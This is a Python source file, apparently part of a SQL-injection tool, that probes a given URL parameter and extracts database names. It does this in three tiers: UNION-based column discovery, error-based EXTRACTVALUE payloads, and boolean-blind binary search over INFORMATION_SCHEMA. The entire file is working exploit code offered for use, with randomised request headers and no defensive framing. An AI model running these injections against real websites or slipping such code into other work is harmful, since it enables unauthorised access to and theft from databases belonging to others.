#!/usr/bin/env python3
import requests
import sys
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from lib.core.logger import get_logger
from lib.core.config import get_config
from lib.parse.random_headers import generate_random_headers
from lib.ui import print_status, colored

logger = get_logger(__name__)
config = get_config()


class DBFetcher:
    def __init__(self, url, param, success_str=None, verbose=False):
        self.url = url
        self.param = param
        self.success_str = success_str
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update(generate_random_headers())

    def inject(self, payload):
        """Injects the payload into the URL at the specified parameter."""
        parsed_url = urlparse(self.url)
        query_params = parse_qs(parsed_url.query)
        
        if self.param not in query_params:
            logger.error(f"Parameter {self.param} not found in URL")
            return None, 0
        
        test_params = query_params.copy()
        original_value = test_params[self.param][0]
        test_params[self.param] = [f"{original_value} {payload}"]
        
        new_query = urlencode(test_params, doseq=True)
        new_parts = list(parsed_url)
        new_parts[4] = new_query
        target_url = urlunparse(new_parts)
        
        try:
            start_time = time.time()
            response = self.session.get(target_url, timeout=config.REQUEST_TIMEOUT)
            duration = time.time() - start_time
            if self.verbose:
                logger.debug(f"Testing payload: {payload} -> status {response.status_code}")
            return response, duration
        except Exception as e:
            if self.verbose:
                logger.error(f"Request failed: {e}")
            return None, 0

    def check_boolean(self, payload):
        resp, _ = self.inject(payload)
        if resp is None:
            return False
        if self.success_str:
            return self.success_str in resp.text
        return resp.status_code == 200

    def extract_error(self, payload):
        resp, _ = self.inject(payload)
        if resp is None:
            return None
        match = re.search(r'~(.*?)~', resp.text)
        if match:
            return match.group(1)
        return None


class UnionFetcher(DBFetcher):
    def run(self):
        print_status("Tier 1: Attempting Union-Based Extraction...", "info")
        cols = self.find_columns()
        if not cols:
            print_status("Union-based column count discovery failed.", "warning")
            return None
        
        print_status(f"Found {cols} columns.", "success")
        
        reflective_col = self.find_reflective_column(cols)
        if reflective_col == -1:
            print_status("No reflective columns found for UNION.", "warning")
            return None

        payload_parts = ["null"] * cols
        payload_parts[reflective_col] = "GROUP_CONCAT(schema_name)"
        payload = f"UNION SELECT {','.join(payload_parts)} FROM INFORMATION_SCHEMA.SCHEMATA"
        
        resp, _ = self.inject(f"-- - {payload}-- -")
        if resp:
            print_status("Union extraction successful!", "success")
            return resp.text
        return None

    def find_columns(self):
        for i in range(1, 50):
            payload = f"ORDER BY {i}-- -"
            resp, _ = self.inject(payload)
            if resp and resp.status_code != 200:
                return i - 1
        return None

    def find_reflective_column(self, count):
        probe = "WAYMAP_PROBE"
        for i in range(count):
            parts = ["null"] * count
            parts[i] = f"'{probe}'"
            payload = f"UNION SELECT {','.join(parts)}-- -"
            resp, _ = self.inject(payload)
            if resp and probe in resp.text:
                return i
        return -1


class ErrorFetcher(DBFetcher):
    def run(self):
        print_status("Tier 2: Attempting Error-Based Extraction...", "info")
        dbs = []
        count = self.get_count()
        if count == 0:
            print_status("Error-based extraction failed to get DB count.", "warning")
            return None
        
        print_status(f"Found {count} databases. Fetching names...", "success")
        for i in range(count):
            payload = f"AND (SELECT 1 FROM (SELECT EXTRACTVALUE(1,CONCAT(0x7e,(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {i},1),0x7e)))x)"
            name = self.extract_error(payload)
            if name:
                print(f"  {colored(f'[>]', 'green')} DB[{i}]: {name}")
                dbs.append(name)
            else:
                print_status(f"Failed to extract DB at index {i}", "warning")
        return dbs

    def get_count(self):
        payload = "AND (SELECT 1 FROM (SELECT EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),0x7e)))x)"
        count_str = self.extract_error(payload)
        return int(count_str) if count_str and count_str.isdigit() else 0


class BlindFetcher(DBFetcher):
    def run(self):
        print_status("Tier 3: Attempting Boolean-Blind Extraction (Binary Search)...", "info")
        dbs = []
        count = self.get_count()
        if count == 0:
            return None
        
        print_status(f"Found {count} databases. Brute-forcing names...", "success")
        for i in range(count):
            length = self.get_length(i)
            print_status(f"DB[{i}] length: {length}", "info")
            name = ""
            for pos in range(1, length + 1):
                char = self.get_char(i, pos)
                name += char
                sys.stdout.write(f"\r  {colored('[>]', 'green')} Progress: {name}")
                sys.stdout.flush()
            print(f"\n  {colored('[!]', 'yellow')} Found: {name}")
            dbs.append(name)
        return dbs

    def get_count(self):
        for i in range(1, 30):
            payload = f"AND (SELECT COUNT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA)={i}-- -"
            if self.check_boolean(payload):
                return i
        return 0

    def get_length(self, index):
        low = 1
        high = 64
        while low <= high:
            mid = (low + high) // 2
            payload = f"AND (SELECT LENGTH(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {index},1)>{mid}-- -"
            if self.check_boolean(payload):
                low = mid + 1
            else:
                high = mid - 1
        return low

    def get_char(self, index, pos):
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"AND ORD(MID((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {index},1),{pos},1))>{mid}-- -"
            if self.check_boolean(payload):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)


def fetch_databases(url, param, verbose=False):
    """Fetch databases from the vulnerable URL and parameter, returns list of database names."""
    print_status("Starting database name extraction...", "info")
    
    # Tier 1: Union
    union = UnionFetcher(url, param, verbose=verbose)
    res = union.run()
    if res:
        print_status(f"Union output (check page/response): {res[:200]}...", "success")
        return []

    # Tier 2: Error
    error = ErrorFetcher(url, param, verbose=verbose)
    res = error.run()
    if res:
        print_status(f"Extracted Databases: {', '.join(res)}", "success")
        return res

    # Tier 3: Blind
    # For blind needs a success string, but for now let's skip if no success string
    print_status("Skipping blind extraction (requires success string)", "warning")

    print_status("All extraction tiers failed. Target may not be vulnerable or WAF is blocking.", "error")
    return []
